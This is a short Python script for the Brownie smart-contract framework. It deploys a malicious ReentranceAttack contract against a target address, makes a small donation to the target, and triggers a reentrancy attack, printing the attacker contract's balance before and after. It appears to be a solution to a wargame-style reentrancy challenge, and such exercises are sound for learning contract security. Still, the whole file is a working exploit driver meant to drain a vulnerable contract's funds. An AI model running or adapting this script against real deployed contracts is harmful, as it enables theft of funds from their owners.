from brownie import accounts, config, interface, ReentranceAttack

def attack(hacker, target, address):
    # We deploy our malicious contract
    attack = ReentranceAttack.deploy(address, '0.0001 ether', {'from': hacker})
    
    # We have to make a donation first so we can call later the withdraw method
    target.donate(attack.address, {'from': hacker, 'amount':'0.0001 ether'})

    print(f'Balance before the attack: {attack.balance()}')    
    # Once we have donated, lets trigger the attack
    attack.attack({'from': hacker})
    print(f'Balance after the attack: {attack.balance()}')

def main(address):
    hacker = accounts.add(config['wallets']['from_key'])
    target = interface.ReentranceInterface(address)    

    attack(hacker, target, address)